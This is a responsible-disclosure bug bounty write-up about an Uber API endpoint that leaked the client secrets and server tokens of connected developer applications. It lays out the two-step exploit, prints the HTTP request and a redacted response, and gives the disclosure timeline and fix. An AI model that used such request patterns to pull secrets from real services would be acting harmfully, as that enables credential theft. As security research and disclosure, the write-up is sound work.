---
title: 'Bounty report: how we discovered Uber’s developer applications were leaking
  client secret and…'
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2019-02-19T14:07:53.000Z'
originalURL: https://freecodecamp.org/news/leakage-of-client-secret-server-tokens-of-all-uber-developer-applications-657d9d7fd30e
coverImage: https://cdn-media-1.freecodecamp.org/images/1*5cU8gS2vFolwBtJbv_9SpQ.png
tags:
- name: api
  slug: api
- name: bug bounty
  slug: bug-bounty
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: uber
  slug: uber
seo_title: null
seo_desc: 'By AppSecure

  This is being published with the permission of Uber under the responsible disclosure
  policy.

  The vulnerability detailed in this blog post is being disclosed by Anand Prakash
  and Manisha Sangwan of team AppSecure. This was plugged quickly...'
---

By AppSecure

_This is being published with the permission of Uber under the responsible disclosure policy._

The vulnerability detailed in this blog post is being disclosed by [Anand Prakash](https://twitter.com/sehacure) and [Manisha Sangwan](https://www.linkedin.com/in/manisha-sangwan-98b9244a/) of team [AppSecure](https://appsecure.in). This was plugged quickly by the engineering team at Uber.

This post is about an information leakage vulnerability on riders.uber.com in which we identified an public API endpoint of [https://riders.uber.com/profile](https://riders.uber.com/profile) that could send back server tokens and client secret for applications authorized by the account owner to access their Uber account.

As per Uber’s [documentation](https://developer.uber.com/docs/businesses/guides/authentication):

> _“The secret for your application, this should be treated like your application’s password. Never share this with anyone, check this into source code, or post in any public forum. Additionally, this should not be distributed on client devices where users could decompile your code and access the secret. If you suspect your client_secret has been compromised you may generate a new one in your application’s dashboard which will immediately invalidate the old secret.”_

This could have been easily exploited by an attacker by connecting their account to any Uber application on production and then using the profile endpoint to retrieve server tokens and client secrets of the connected application in the API response.

Uber fixed this issue by removing this data from the API response, as reported. Uber publicly notified all developers of this vulnerability and asked developers to rotate secrets on a periodic basis.

![Image](https://cdn-media-1.freecodecamp.org/images/OMCDfDQdImuNb4ruNqBPwCGX5wlb6i19ufET)
_Notification sent by Uber to developers._

### About Uber

Uber is a transportation network company (TNC) headquartered in San Francisco, California. Uber offers services including peer-to-peer ridesharing, taxi cab hailing, food delivery, and a bicycle-sharing system. The company has operations in 785 metropolitan areas worldwide. Uber has a valuation of over $100 billion as per [Bloomberg’s](https://www.bloomberg.com/news/articles/2018-10-16/uber-valued-at-120-billion-in-an-ipo-maybe) report.

### How my exploit worked step-by-step

#### Step #1

Attacker connects a random Uber developer application to their account using OAuth. A few examples of Uber developer applications are [IFTTT](https://eng.uber.com/ifttt-uber-automation/), [Payfare](https://uber-developers.news/uber-and-payfare-partner-to-pay-driver-partners-right-away-eec7a1f5335c?source=rss----49ee238f1dea---4&gi=e6336207cb0e), and [Bixby](https://uber-developers.news/uber-and-samsung-team-up-to-leverage-contextual-awareness-on-galaxy-s8-and-s8-935f5b5dbab8). It is not identified as a complicated procedure as of now.

#### **Step #2**

Once the above apps are connected by the attacker to their Uber account, they can use against the endpoint to get the developer application’s confidential data and other significant information of the application using the attacker’s session data.

**The vulnerable Uber API:**

`POST /api/getAuthorisedApps HTTP/1.1`  
`Host: riders.uber.com`  
`User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0`  
`Accept: */*`  
`Accept-Language: en-US,en;q=0.5`  
`Accept-Encoding: gzip, deflate`  
`Referer: [https://riders.uber.com/profile](https://riders.uber.com/profile)`  
`content-type: application/json`  
`x-csrf-token: XXX`  
`origin: [https://riders.uber.com](https://riders.uber.com)`  
`Content-Length: 2`  
`Cookie:`

**Data getting leaked in API response:**

`{“status”:”success”,”data”:{“data”:{“uuid”:”xxxx”},”clientScopes”:{“authorizedClientScopes”:[{“clientID”:”xxx”,”scopes”:[“history”,”offline_access”,”profile”]}]},”scopeDetails”:[{“applicationDetails”:{“applicationID”:”xxx”,”owner”:{“userUUID”:”xxxx”,”userEmail”:””},”applicationSecret”:”xxx”,”name”:”xxx”,”description”:”abc”,”privacyPolicyURL”:”[https://appsecure.in](https://appsecure.in)","surgeConfirmedRedirectURI":"","webhookURL":"","applicationType":"","requestsPerHour":{"low":0,"high":0,"unsigned":false},"redirectURIs":["xxxxxx"],"appSignatures":[],"defaultScopes":["history","profile"],"whitelistedScopes":[],"originURIs":[],"serverTokens":["xxx"],"ipWhitelist":[],"admins":[{"userUUID":"xxxx","userEmail":""},{"userUUID":"xxxx","userEmail":""},{"userUUID":"xxxx","userEmail":""}],"developers":[{"userUUID":"xxxx","userEmail":""}],"tags":[],"oauthEnabled":false,"smsVerificationEnabled":false,"cobrandingEnabled":false,"supplyOnly":false,"isInternal":true,"cobrandingDetails":{"nativeURL":"","androidFallbackURL":"","iosFallbackURL":"","displayName":"","linkName":"","logoUUID":"","logoFiletype":"","generatedLogoURL":""},"availableScopes":["delivery","history","history_lite","places","profile","ride_widgets"],"openScopes":["delivery","history","history_lite","places","profile","ride_widgets"],"developerScopes":["all_trips","request","request_receipt"],"createdAt":{"low":xxx,"high":0,"unsigned":false},"updatedAt":{"low":xxx,"high":0,"unsigned":false},"displayName":null,"iconURL":null,"publicDescription":null,"appGalleryDetails":{"mobilePlatforms":[],"publicationState":"","redirectURI":"xxxx","permissionState":""}},"permissions":null,"userRoleInvitations":null}]}}`

#### **Disclosure Timeline**

**October 5th, 2018:** Report sent to Uber’s Security team.

**November 6th, 2018:** Issue resolved by Uber. AppSecure asked Uber to notify all developers in case their app secrets were no longer confidential. We verified the fix.

**December 20th 2018:** Uber replied, stating, “They are in process of notifying the developers and in process of putting up long term fix in place for this issue.”

**February 8th 2019:** Uber rewarded us with $5000 bounty and notified all developers via email about the same. The issue was publicly disclosed after the action was conducted.

